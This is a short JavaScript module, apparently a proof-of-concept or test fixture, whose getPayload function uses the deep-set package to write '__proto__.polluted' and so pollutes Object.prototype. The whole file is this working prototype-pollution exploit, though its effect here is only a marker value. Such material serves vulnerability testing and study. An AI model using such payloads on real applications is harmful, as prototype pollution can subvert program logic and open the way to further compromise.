function getPayload() {
    const deepSet = require("deep-set");
    const obj = { 1: "2" };
    deepSet(obj, "__proto__.polluted", "yes");
    return { obj };
}

module.exports = { getPayload };